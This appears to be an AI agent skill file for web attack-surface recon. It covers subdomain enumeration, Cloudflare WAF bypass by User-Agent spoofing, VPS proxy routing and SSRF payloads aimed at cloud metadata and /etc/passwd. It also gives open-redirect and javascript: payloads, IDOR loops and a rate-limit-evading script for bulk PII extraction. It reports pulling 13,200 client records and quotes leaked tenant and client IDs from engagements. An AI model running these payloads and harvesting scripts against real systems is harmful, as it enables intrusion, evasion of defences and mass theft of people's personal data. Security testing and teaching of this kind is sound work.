---
name: web2-recon
description: Web2 recon pipeline — subdomain enumeration, live host discovery, URL crawling, directory fuzzing, JS analysis, Cloudflare WAF bypass, API docs discovery, chained data extraction (notification feed → search pagination → ad page PII), SSRF/open redirect testing, authenticated recon with session cookies. Use when starting recon on any web2 target or when asked about asset discovery, subdomain enum, attack surface mapping, or mass PII extraction.
---

# WEB2 RECON PIPELINE

Full asset discovery from nothing to a prioritized URL list ready for hunting.

---

**VPS Routing:** When routing traffic through a VPS (for OPSEC or IP diversity):
```bash
# Create SOCKS proxy through VPS
ssh -D 9050 -N -f root@<VPS_IP> -o StrictHostKeyChecking=no

# Use proxy for all curl requests
export http_proxy=socks5h://127.0.0.1:9050 https_proxy=socks5h://127.0.0.1:9050
curl -s "https://target.com/"
```

**Tool Installation on VPS:** If local tools are missing, install Go-based tools on the VPS:
```bash
ssh root@<VPS_IP> 'export PATH=$PATH:~/go/bin; go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest && go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest && go install -v github.com/tomnomnom/assetfinder@latest && go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest'
```

**Pitfall:** Standard subdomain wordlists (300+ common names) miss documentation subdomains. Always check for:
- `docs.target.com` — API documentation (Mintlify, ReadTheDocs, GitBook)
- `developer.target.com` — Developer portal
- `api-docs.target.com` — API docs
- `reference.target.com` — API reference

These often expose full API endpoint lists, auth schemes, rate limits, and example requests — even when the API itself requires authentication. The docs site may be on a separate platform (e.g., Mintlify) with no auth required.

**Real-world example (real-estate SaaS engagement):** `docs.example-realestate.tld` (Mintlify) exposed the complete API reference with 21 endpoints, full request/response schemas, rate limits, supported video sources, and storage backend details — all without authentication. This revealed the entire attack surface including endpoints like `/lives/public` (unauthenticated), `/createShorts`, `/renders/bulk`, and `/lives/monitor` that we hadn't discovered through enumeration.

**Sentry Route Manifest:** Next.js apps with Sentry SDK inject `globalThis._sentryRouteManifest` into JS bundles, containing ALL dynamic routes. From `/_next/static/chunks/0n-m7uxv.jr7k.js` we extracted 19 routes including `/share/:projectId`, `/webview/:projectId`, `/test-sentry`, `/maintenance`. Also reveals `_sentryNextJsVersion` (was "16.2.6"). The Sentry DSN itself is injected via env var and typically NOT in client bundles.

**Auth0 / OIDC Provider Recon:** When an Auth0 (or generic OIDC) tenant is discovered, always check:
```bash
# JWKS - public signing keys (rotating)
curl -s "https://auth.target.com/.well-known/jwks.json" | jq '.keys[] | {kid, kty, alg, n}'

# OpenID Configuration - all endpoints, scopes, grant types
curl -s "https://auth.target.com/.well-known/openid-configuration" | jq

# Dynamic client registration (often disabled)
curl -s -X POST "https://auth.target.com/oidc/register" \
  -H "Content-Type: application/json" \
  -d '{"redirect_uris":["https://example.com"],"client_name":"test"}'
```
Key findings to document:
- `client_id` leaked in login flow (check redirect URLs)
- `audience` parameter → target API
- PKCE enforcement (S256 vs plain)
- Scopes supported (`openid profile email offline_access`)
- Token endpoint auth methods (`client_secret_basic`, `private_key_jwt`, `none`)
- JWKS key rotation schedule (check `x5t`, `kid`)

**Real-world (robotics-platform engagement):**
- Issuer: `https://auth.example-robotics.tld/` (Auth0 tenant: `dev-kg4tyyt7ym24gr0j.us.auth0.com`)
- Client ID: `WXgT6onMEaCfMzHzsB5LtRWx5X9UWxDY` (leaked in `/login` redirect)
- Audience: `https://api.example-robotics.tld`
- JWKS: 2 rotating RSA keys (RS256)
- Dynamic client registration: **DISABLED** ("dynamic client registration is disabled")
- PKCE: S256 enforced

**WebRTC Signaling Server Recon:** Robotics/teleoperation platforms often expose a signaling server for WebRTC peer connections. Check for:
```bash
# Common paths
for path in /connections /health /api/connections /v1/connections /signaling /ws /websocket /rtc /webrtc; do
  curl -s -o /dev/null -w "%{http_code} $path\n" "https://signaling.target.com$path"
done

# If FastAPI/Swagger exposed
curl -s "https://signaling.target.com/docs"
curl -s "https://signaling.target.com/openapi.json" | jq '.paths | keys[]'

# Test CORS on signaling endpoints
curl -s -H "Origin: https://evil.com" -I "https://signaling.target.com/connections" | grep -i access-control
```

**What to look for:**
- Public `/connections` or `/health` endpoints (fleet enumeration)
- Jobsites/fleet status without auth
- WebSocket upgrade paths (`/ws`, `/websocket`, `/signaling`)
- STUN/TURN server configuration (often `stun:stun.cloudflare.com:3478`)
- Data channel labels: `robot_telemetry`, `episode_events`, `robot_left`, `robot_right`
- Robot control protocol over data channels (JSON: `{type:"robot_control",command:...}`)
- CORS misconfiguration on signaling API

**Real-world (robotics-platform engagement):**
- `signaling.example-robotics.tld` (<origin-ip>, uvicorn/Caddy)
- `/docs` + `/openapi.json` **public** (FastAPI/Swagger UI)
- `GET /connections` → 5 occupied robot UUIDs + 1 available (no auth)
- `POST /connections` → accepts arbitrary jobsite list for status check
- WebSocket endpoints not found at standard paths
- Robot firmware/DH params leaked in frontend bundles (UFactory Lite-6, XArm 6, URDF paths)

**Cloudflare WAF Bypass:** The API behind Cloudflare returned Error 1010 for non-browser User-Agents. Bypassed by setting a browser-like UA string. No JS challenge was enforced — simple UA spoof was sufficient.

**Cloudflare Error Codes (important distinction):**
- **525** = SSL handshake failure (origin server down/misconfigured, NOT WAF)
- **1010** = WAF bot detection block (try browser UA bypass)
- **502** = Bad gateway (origin misconfigured but reachable)
Don't confuse 525 with 1010 — completely different issues requiring different approaches.

**Well-Known Endpoints & MCP Recon:** Docs subdomains (especially Mintlify) often expose API metadata under `/.well-known/` — MCP server cards, OAuth resources, agent specs. MCP server root pages leak all tool names in HTML even when the actual JSON-RPC endpoint is behind a WAF. Always check CORS on MCP servers (wildcard `*` is common). See `references/well-known-and-mcp-recon.md` for the full probing checklist and real-world examples.

**JS Bundle Hash Comparison:** When multiple subdomains serve SPA apps, compare the JS bundle filenames/hashes (e.g., `main.8f65294c.js`). Identical hashes = same application backend. This reveals hidden relationships: `auth.target.com` and `atendimento.target.com` sharing a single "service-desk SPA atende" React app means compromising one gives insight into the other. Extract API endpoints from one bundle and test them against all matching subdomains.

**Cloudflare Error Codes as Bypass Indicators:** Subdomains behind Cloudflare returning 525 (SSL handshake failed) or 502 (bad gateway) indicate origin server misconfiguration. These are high-priority targets:
- **525:** Origin SSL cert mismatch — try direct IP access or alternate ports
- **502:** Origin server down or misconfigured — the app may be accessible via HTTP on non-standard ports
- **503/522/524:** Origin timeout — slow-rate attacks may bypass rate limiting
- Always retry with `Host` header set to the subdomain and direct IP from DNS resolution

**VPS-Based Recon Execution:** When local recon tools are missing, install and run them through the VPS:
```bash
# Install Go tools on VPS
ssh root@<VPS> 'export PATH=$PATH:~/go/bin; go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest; go install github.com/projectdiscovery/httpx/cmd/httpx@latest; go install github.com/tomnomnom/assetfinder@latest; go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest; go install github.com/projectdiscovery/katana/cmd/katana@latest'

# Run enumeration through VPS
ssh root@<VPS> 'export PATH=$PATH:~/go/bin; subfinder -d target.com -silent | httpx -silent -status-code -title -tech-detect'
```

---

## cert.sh Subdomain Discovery (Passive DNS Fallback)

When `subfinder` and `amass` return nothing (common for smaller Brazilian domains, new startups, or uncrawled infrastructure), use **cert.sh** for subdomain enumeration via SSL certificate transparency logs.

```bash
curl -s "https://crt.sh/?q=%25.target.com&output=json" | python3 -c "
import json,sys
data = json.load(sys.stdin)
names = set()
for entry in data:
    name = entry.get('name_value','')
    for n in name.split('\n'):
        if n.strip(): names.add(n.strip().lower())
for n in sorted(names): print(n)
"
```

**Why:** crt.sh catches subdomains that passive DNS misses (new deployments, private infra, uncrawled domains). **Real-world:** subfinder + amass returned ZERO for `example-insurance.tld`; cert.sh revealed 9 subdomains including `cotacao`, `gopricing`, `clerk.gopricing`, and `accounts.gopricing`.

**Pitfall:** crt.sh rate-limits after ~10 req/min. Use `sleep 1` between requests. Wildcard certs (`*.domain.com`) don't reveal child subdomains.

---

## Vercel / Next.js API Path Brute-Force

Vercel-hosted Next.js apps expose API routes under `app/api/` or `pages/api/` that may lack auth guards. Test common paths directly without JS analysis:

```bash
for path in /api/policies /api/clients /api/users /api/auth /api/login \
            /api/health /api/config /api/dashboard /api/stats \
            /api/proposals /api/vehicles /api/quotes /api/insurance \
            /api/payments /api/claims /api/admin /api/settings; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 "https://target.com${path}")
  [ "$code" != "404" ] && [ "$code" != "000" ] && echo "${path} → ${code}"
  if [ "$code" == "200" ]; then
    curl -s "https://target.com${path}" | head -200
  fi
done
```

**Viral pattern:** `/api/policies` or `/api/clients` returning 200 = CRITICAL data leak. Test individual IDs too: `/api/policies/{id}` may return even more detail.

**Vercel fingerprinting:**
- `x-vercel-id` header in responses = hosted on Vercel
- Error `DEPLOYMENT_NOT_FOUND` on HTTP (port 80) = subdomain exists but NOT deployed on Vercel
- `x-vercel-mitigated: deny` + 403 = Vercel WAF / Security Checkpoint

**Real-world (insurance-group engagement (phase 2)):** `app.example-insurance.tld` (Next.js on Vercel):
- `GET /api/policies` → 753 policies with PII (name, email, phone, CPF, plate) — **NO AUTH**
- `GET /api/clients` → 13,236 clients with PII — **NO AUTH**
- `GET /api/policies/{id}` → individual detail with splitrisk ID — **NO AUTH**
- `GET /api/users` → 401 (exists but protected — confirms more internal routes exist)

---

## Admin Panel Framework Fingerprinting

Form field naming patterns reveal backend framework even when the file extension is misleading:

```bash
curl -sL "https://target.com/admin/login.php" | grep -oP 'name=["'"'"'][^"'"'"']+' | sort -u
```

- `_csrf` + `next` → Node.js (AdonisJS/Express)
- `_token` → Laravel/PHP
- `csrfmiddlewaretoken` → Django
- `authenticity_token` → Rails

**Real-world (insurance-group engagement (phase 2)):** `cotacao.example-insurance.tld/admin/login.php` uses `_csrf` (Node.js) with `next=/admin/index.php?page=sessions` — despite `.php` extension, it's Node.js behind a reverse proxy.

---

## Laravel-Specific Recon

When Laravel is detected (via headers, cookie patterns, or Livewire), probe these endpoints:

```bash
# Sanctum SPA auth
curl -sv 'https://target.com/sanctum/csrf-cookie' 2>&1 | grep -i 'set-cookie'
# 204 + XSRF-TOKEN + session cookie = Sanctum active

# Horizon queue dashboard
curl -s -o /dev/null -w '%{http_code}' 'https://target.com/horizon'
# 403 (styled Tailwind error page) = Horizon installed but protected
# 200/302 = Horizon dashboard accessible

# Other Laravel internal tools
for tool in horizon telescope nova nova-api; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/${tool}")
  echo "${tool}: ${code}"
done
```

Livewire components expose a `wire:snapshot` in the HTML containing component name, route, method, and field structure.

See `references/laravel-recon-patterns.md` for CSRF token formats, Livewire snapshot analysis, endpoint detection, and real-world examples.

---

## cPanel / WHM Discovery on Non-Standard Ports

cPanel and WHM expose management interfaces on non-standard ports (2083, 2087) that may be proxied by Cloudflare Spectrum:

```bash
# Discover cPanel subdomains
for sub in cpanel whm webmail cpcalendars cpcontacts webdisk autodiscover; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "https://${sub}.target.com/")
  echo "${sub}.target.com -> ${code}"
done

# If whm/cpanel found, try direct port access
curl -sL --connect-to 'whm.target.com:2087:CLOUDFLARE_IP' 'https://whm.target.com:2087/'
# <title>Login no WHM</title> = WHM accessible

curl -sL --connect-to 'whm.target.com:2083:CLOUDFLARE_IP' 'https://whm.target.com:2083/'
# <title>Login do cPanel</title> = cPanel accessible
```

Common response codes:
- `cpanel` → 525/526 (SSL behind Cloudflare Spectrum)
- `whm` → 526 (different cert issue)
- `cpcalendars` → 503 (Service Unavailable — cPanel exists)
- `cpcontacts` → 503
- `webdisk` → 401 (Authorization Required)
- `autodiscover` → 400 (email autodiscovery)

**Cloudflare Spectrum indicators:** `server: cloudflare` + `alt-svc: h3=":2087"` on non-standard ports.

See `references/cpanel-whm-discovery.md` for full port mapping, version fingerprinting, shared server detection, and real-world examples.

---

## Rate-Limited Paginated API Data Extraction

When extracting data from paginated APIs that return HTTP 429 (Too Many Requests), use adaptive strategies:

### Key Techniques

1. **Reduce request count** — Use the largest `pageSize` the API supports (100 vs 20 = 5x fewer requests)
2. **Adaptive backoff** — Increase delay on 429, decrease on success. Start at 1.5s, back off to 5-8s on 429
3. **Checkpoint saving** — Save results every N pages so partial extraction isn't lost on timeout
4. **User-Agent rotation** — Some APIs rate-limit based on UA. Try `Mozilla/5.0` if the default Python UA gets blocked
5. **Background extraction** — For large datasets (10k+ records), run in background with `notify_on_complete=true`

### Real-World Example (insurance-group engagement (phase 2))

13,200 clients extracted from `GET /api/clients` on Vercel:

```python
base = "https://target.com/api/clients"
page_size = 100   # instead of 20 — 5x fewer requests
delay = 2.5

while offset < total:
    url = f"{base}?page={page}&pageSize={page_size}"
    try:
        time.sleep(delay)
        resp = urllib.request.urlopen(url, timeout=20)
        items = json.loads(resp.read())["data"]
        all_data.extend(items)
        if len(all_data) % 500 == 0:
            checkpoint_save()  # save every 500 records
        delay = max(0.5, delay - 0.1)  # decrease on success
        page += 1
    except urllib.error.HTTPError as e:
        if e.code == 429:
            delay = min(8, delay + 1.5)  # back off on rate limit
            time.sleep(5)
```

**Results:** 13,200 records extracted despite Vercel rate limiting, with 3.2MB final JSON file.

See `references/rate-limited-api-extraction.md` for the full extraction script template, checkpoint logic, and error recovery patterns.

---

## Webmail / Roundcube Catch-All False Positive

Roundcube webmail (and cPanel's default webmail) uses a **catch-all route** that returns the login page for ANY non-matching path:

```
/installer          → 200 (login page, NOT installer)
/installer/index.php→ 200 (login page, NOT installer)
/bin/               → 200 (login page, NOT bin listing)
/SQL/               → 200 (login page, NOT SQL directory)
/README             → 200 (login page, NOT readme file)
/CHANGELOG          → 200 (login page)
/composer.json      → 200 (HTML login page, NOT JSON)
```

These are **NOT** exposed directory listings — the router serves the login page for everything. To confirm: check Content-Type (it will be `text/html` even for `.json` paths) or look for the Roundcube/cPanel login template HTML.

**Detection:** Roundcube on cPanel reveals itself through:
- Cookies: `roundcube_sessid`, `roundcube_sessauth`
- CSS paths: `/cPanel_magic_revision_*/unprotected/cpanel/style_v2_optimized.css`
- Form: `action="/login/"`, fields `user`, `pass`
- Response headers: `set-cookie: webmailsession=...`

**Shared-server indicator:** If webmail HTML references `/cPanel_magic_revision_*` CSS paths, it's on the SAME server as cPanel/WHM.

---

## Convex API Testing

Convex is a backend-as-a-service (like Firebase) that exposes client-facing API endpoints:

### Endpoint Patterns
```
POST /api/query      — Execute query functions (returns data or BadConvexFunctionIdentifier)
POST /api/mutation   — Execute mutation functions (returns 405 if function name is wrong)
POST /api/action     — Execute action functions (returns 405 if function name is wrong)
```

### Function Name Discovery
Convex function names follow `module:functionName` or `moduleName:functionName` patterns. They are typically embedded in JS client bundles but only loaded AFTER authentication:

- Check `useQuery("moduleName", ...)` in JS bundles
- Check `r = ["path"]` arrays in minified code
- If the app requires auth (Clerk, Supabase), functions won't appear in public bundles
- Brute-forcing function names rarely works

### Techniques
- Page source reveals the Convex URL (e.g., `happy-otter-123.convex.cloud`) and Clerk/Supabase publishable key
- Try `convex.site` for HTTP Actions (custom endpoints)
- Test empty path to confirm API is live: `{"code":"BadConvexFunctionIdentifier",...}`
- Convex functions behind auth gate are typically NOT enumerable through public endpoints
- The `NEXT_PUBLIC_CONVEX_URL` and `NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY` are **public by design** — not vulnerabilities

---

## DMARC/SPF/DKIM Enumeration

```bash
# Check DMARC policy
dig +short TXT _dmarc.target.com
# Check SPF record
dig +short TXT target.com | grep 'v=spf1'
# Check DKIM selectors (common ones)
for s in default mail google k1 k2 selector1 selector2; do dig +short TXT ${s}._domainkey.target.com; done
```

**DMARC p=none:** DMARC policy of `p=none` means no enforcement — the domain accepts all mail without DMARC checks. This enables email spoofing. Always flag DMARC p=none as a LOW finding, and test actual spoofing if in scope.

---

## CORS Misconfiguration Testing

```bash
curl -s -H 'Origin: https://evil.com' -I "https://target.com" | grep -i 'access-control'
# Look for: access-control-allow-origin: * (wildcard)
# If combined with credentials/cookies = MEDIUM finding
```

---

## curl Fallback for HTTP Probing

When `httpx` is unavailable or gives different flags, use curl in a loop:

```bash
for sub in $(cat subs.txt); do
  timeout 5 curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" \
    -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' \
    "https://${sub}" 2>/dev/null || echo "000 https://${sub}"
done
```

---

## API Endpoint Testing from Historical URLs

After `gau`/`waybackurls`, filter for API patterns and test:

```bash
gau target.com | grep -E '/api/|/v[0-9]/|/graphql|/rest/' | sort -u | \
  while read url; do curl -s -o /dev/null -w "%{http_code} $url\n" "$url"; done
```

---

## PHP Image Proxy / Thumbnail Endpoint SSRF + Open Redirect

**Pattern:** PHP apps often have `/thumb.php`, `/image.php`, `/resize.php`, `/proxy.php` endpoints that accept a `src`/`url`/`image` parameter.

**Test checklist:**
```bash
# 1. Open redirect via arbitrary URL
curl -s -v "https://target.com/thumb.php?src=https://httpbin.org/get" 2>&1 | grep -i location

# 2. SSRF to cloud metadata services
curl -s -v "https://target.com/thumb.php?src=http://169.254.169.254/latest/meta-data/" 2>&1 | grep -i location
curl -s -v "https://target.com/thumb.php?src=http://169.254.169.254/metadata/v1/" 2>&1 | grep -i location  # DigitalOcean
curl -s -v "https://target.com/thumb.php?src=http://metadata.google.internal/" 2>&1 | grep -i location  # GCP

# 3. File protocol / local file read
curl -s -v "https://target.com/thumb.php?src=file:///etc/passwd" 2>&1 | grep -i location
curl -s -v "https://target.com/thumb.php?src=/etc/passwd" 2>&1 | grep -i location

# 4. Internal service enumeration
curl -s -v "https://target.com/thumb.php?src=http://localhost:8080/" 2>&1 | grep -i location
curl -s -v "https://target.com/thumb.php?src=http://127.0.0.1:3306/" 2>&1 | grep -i location
```

**Key indicators of vulnerability:**
- Returns `302` / `301` redirect to the `src` value without validation
- No allowlist of permitted domains/paths
- Follows redirects (test with redirect chain to metadata service)
- Cloud metadata returns data → **CRITICAL** (IAM credentials, SSH keys, user-data)
- **`javascript:` protocol redirect → XSS vector** — If the redirect Location header has `javascript:alert(1)`, older browsers/compat modes may execute it as a pseudo-URL.

**URL parsing quirk:** Some PHP thumb scripts return 400 for bare domains (no path, no trailing slash) but 302 for URLs with path or trailing slash:
```bash
curl -sI "https://target.com/thumb.php?src=https://evil.com"       # 400 Bad Request
curl -sI "https://target.com/thumb.php?src=https://evil.com/"      # 302 Redirect
curl -sI "https://target.com/thumb.php?src=//evil.com"              # 302 Always works
```
This is a PHP parse_url() behavior, NOT a security control. Protocol-relative URLs bypass the restriction entirely.

**Real-world example (insurance-group engagement (phase 1)):** `example-garage.tld/thumb.php?src=http://169.254.169.254/latest/meta-data/` returned 302 to AWS metadata service. Also redirected to `https://httpbin.org/get`, `file:///etc/passwd`, and `src=javascript:alert(1)` returned `Location: javascript:alert(1)`.

---

## Hardware / Robot Specs Leakage in Frontend Bundles

Robotics platforms often embed full hardware specifications in client-side JS bundles. Search for these patterns:

```bash
# Search for hardware specs in Next.js chunks
for chunk in $(curl -s "https://target.com" | grep -oE '_next/static/chunks/[^"]+\.js'); do
  curl -s "https://target.com/${chunk}" | strings | grep -iE 'dhparams|urdf|reach|payload|dof|gripper|endEffector|robot_info|make|model|DHParams|urdfPath'
done
```

**What to look for:**
- DH parameters (Denavit-Hartenberg) for inverse kinematics
- URDF paths (`urdf/Lite6/lite6_robot.urdf.xacro`)
- Robot capabilities: reach (mm), payload (kg), DOF, max speed
- End effector specs: opening width, tool types
- Camera configurations (overhead, gripper-mounted)
- Input device support (gamepad, flight sticks, leader arms, VR controllers)

**Real-world (robotics-platform engagement):**
- UFactory Lite-6: 6-axis, 500mm reach, 0.5kg payload, 200mm/s max speed
- XArm 6: 6-axis, 700mm reach, 5kg payload
- vendor gripper product, v1: 50mm opening
- 4 cameras: 2 overhead + 2 gripper-mounted
- Input: Gamepad, Thrustmaster/Logitech flight sticks, Gello/Discrete leader arms, Quest controllers

---

## Supabase Magic Link User Enumeration

**Pattern:** Next.js apps using Supabase auth with magic links often expose user enumeration.

**Discovery:**
1. Find login page → inspect form action / Network tab for Server Action call
2. Look for Supabase client in JS bundles: `supabase.auth.signInWithOtp`
3. Check `shouldCreateUser: false` — means only existing users can sign in

**Test:** Submit magic link request for known vs unknown email and compare error messages.

**Real-world example (insurance-group engagement (phase 1)):** `app.example-insurance.tld` uses Supabase with `shouldCreateUser: false`.

---

## Chained Data Extraction (Marketplace PII Leak)

**Pattern:** Public notification feed + search pagination + ad page scraping = mass PII extraction without auth.

See `references/chained-data-extraction.md` for regex patterns, rate-limiting test, correlation logic, and real-world example (2029 entries, 1999 phones, 1989 WhatsApp in 6 min).

---

## Validate by content signature, never by status code

On SPA hosts, HTTP 200 means nothing. The router returns `index.html` for any path, so a naive
sweep reports `/.git/config`, `/.env`, `/appsettings.json` and every other probe as a hit.

Every false positive in a 40k-subdomain engagement came from trusting a status code. Validate the
**body signature** instead:

| Path | Required signature |
|---|---|
| `.git/HEAD`, `.git/ORIG_HEAD` | `ref: refs/` or a 40-hex SHA |
| `.git/config` | `[core]` |
| `.git/index` | `DIRC` magic bytes |
| `.git/logs/HEAD` | `<40-hex> <40-hex>` |
| `.git/refs/*` | bare 40-hex |
| `.env*` | `KEY=VALUE` lines, and not markup |
| `.DS_Store` | `Bud1` magic |
| `.htpasswd` | `user:$hash` |
| `.svn/entries` | leading integer or `dir` |

Rules to apply:

- **Positive matching only.** Do not test "is it not HTML" — that inverts badly. A real case:
  `grep -qivE '<html|<!doctype'` returned true on an HTML page whose first line was a comment
  (`<!-- Copyright ... -->`), and again on multi-line input where any single line lacked the
  pattern. Use `! grep -qiE ...` or, better, require a positive signature.
- **Drop probes with no reliable signature.** `.git/COMMIT_EDITMSG` is free-form text and cannot be
  validated; every hit on it was an SPA catch-all. Remove it rather than guess.
- **Baseline every host.** Request a random nonexistent path first and record its status and length.
  Discard any probe whose response matches that baseline.
- **Sweep hosts whose root is not 200.** A 401/403/404 root says nothing about `/.git`. Scoping a
  sweep to 200-roots misses API servers entirely, which commonly 404 at `/`.

Same discipline applies to API-surface work: a public `swagger.json` is not a finding until you
test whether the documented endpoints actually enforce auth. Most of the time they do.

## ⚠️ CRITICAL: Recon Phase = READ-ONLY

**NEVER make mutations during recon.** No POST/PUT/PATCH/DELETE on data endpoints unless explicitly authorized by the user.

Bad (DON'T):
```bash
# ❌ Creating a test post during recon — WRONG
curl -s -X POST "https://target.com/api/posts" -d '{"title":"test","content":"test"}'
```

Good (DO):
```bash
# ✅ Only discover endpoints — use GET/HEAD/OPTIONS
curl -s "https://target.com/api/posts"          # Check if endpoint exists
curl -s -X OPTIONS "https://target.com/api/posts" # Check allowed methods
curl -s -o /dev/null -w "%{http_code}" "https://target.com/api/posts"  # Status only
```

If you accidentally make a mutation and the user notices, they will (rightfully) be annoyed. The user has explicitly said: "ja te disse pra nao fazer nenhuma açao desse tipo" (I already told you not to do this kind of action).

**Rule:** If you're not sure whether an endpoint mutates data, don't call it with anything other than GET/HEAD/OPTIONS. Document the endpoint existence and move on. Only write mutations (posts, comments, profile edits, subscriptions) when the user explicitly says "test this" or "try to create one".

---

## Authenticated Recon — Login + Session Cookie Deep Probe

**Pattern:** After obtaining valid credentials, recon enters a new phase — authenticated endpoints, private data APIs, and PII exposure surfaces become accessible.

### Login Flow with CSRF Token

Many PHP/Laravel apps use CSRF-protected login forms:

```bash
# 1. GET login page to establish session + extract CSRF token
CSRF=$(curl -s -c /tmp/cookies.txt 'https://target.com/auth/login.php' | \
  grep -oP 'value="[a-f0-9]+"' | head -1 | cut -d'"' -f2)

# 2. POST credentials with CSRF token — use -d @/tmp/post.txt to avoid shell escaping
echo "action=login&email=user@example.com&password=secret!123&csrf=$CSRF&remember=1" > /tmp/post.txt
curl -sv -c /tmp/auth_cookies.txt -b /tmp/cookies.txt -L -X POST \
  'https://target.com/auth/login.php' -d @/tmp/post.txt

# 3. Verify auth — 302 redirect to / means success
```

### Pitfall — Shell Escaping with Special Characters in Passwords

When password has `&`, `@`, `$`, `#`, `!`:

**BROKEN:**
```bash
curl -d "password=test@123&csrf=$CSRF"    # & breaks parsing
```

**FIXES:**
1. **Write POST data to a file** (recommended):
```bash
echo 'email=user@x.com&password=test@123&csrf=TOKEN' > /tmp/post.txt
curl -d @/tmp/post.txt
```

2. **Use Python** to build the request (avoids shell entirely):
```python
import subprocess
subprocess.run(['curl', '-d', 'email=x@x.com&password=secret@123', url])
```

3. **Use `--data-urlencode`**
```bash
curl --data-urlencode 'password=test@123&csrf=TOKEN'
```

### Cookie vs API Key Auth

**Critical:** Web session cookies often do NOT work for API endpoints:
- Cookie on `/api/v1/ads` → `"Autenticação ausente."` → cookie not recognized
- Bearer token on `/api/v1/ads` → `"API Key inválida."` → Bearer format recognized
- Different error messages reveal auth mechanism

### Post-Login Recon Checklist

```bash
# 1. Profile/settings — user PII, roles
curl -s -b /tmp/auth_cookies.txt 'https://target.com/profile.php'

# 2. Private notification endpoints
curl -s -b /tmp/auth_cookies.txt 'https://target.com/api/user_notifications.php'

# 3. Profile tabs — wallet, store, saved items, affiliate system
for tab in anuncios loja salvos carteira mensagens; do
  curl -s -b /tmp/auth_cookies.txt "https://target.com/profile.php?pagina=$tab"
done

# 4. Other user profiles (IDOR check)
for uid in 1 2 3 5 10 100; do
  curl -s -b /tmp/auth_cookies.txt -o /dev/null -w "%{http_code}" \
    "https://target.com/profile.php?user_id=$uid"
done
```

### Pitfalls
- Session cookie rarely works for API — check separately with Bearer/JWT
- Livewire login needs correct `wire:id` + CSRF + snapshot
- Magic link / OTP auth (Supabase, Clerk) needs browser, not curl
- Empty wallet/notifications = clean account, not broken endpoint
- `?user_id=N` may show logged-in user regardless of the parameter

---

## Report Generation

After recon and exploitation, generate a vulnerability report in the target language. Structure each finding:

1. **Summary** — One-line description
2. **Technical Explanation** — How it works, endpoints, parameters
3. **Proof of Concept (PoC)** — Exact curl commands or code that reproduces
4. **Hypothetical Scenario** — Real-world attack chain narrative
5. **Other Possible Impacts** — Additional risk scenarios
6. **Remediation** — Step-by-step fix instructions

Include severity rating (CRITICAL/HIGH/MEDIUM/LOW). Save as markdown in the engagement directory.

---

## Session References

- `references/chained-data-extraction.md` — Chain 3 public endpoints for mass data extraction
- `references/bot-mitigation-handling.md` — Bot mitigation bypass
- `references/nextjs-server-actions.md` — Next.js Server Actions patterns
- `references/cors-crash-pattern.md` — CORS crash analysis
- `references/js-bundle-api-discovery.md` — JS bundle API endpoint discovery
- `references/internal-api-auth-bypass.md` — Unauthenticated admin API patterns
- `references/scalar-elysia-openapi-discovery.md` — Scalar/Elysia OpenAPI discovery
- `references/cpanel-whm-discovery.md` — cPanel/WHM discovery on non-standard ports
- `references/laravel-recon-patterns.md` — Laravel Sanctum, Horizon, Livewire recon
- `references/roundcube-webmail-recon.md` — Roundcube detection, catch-all false positives
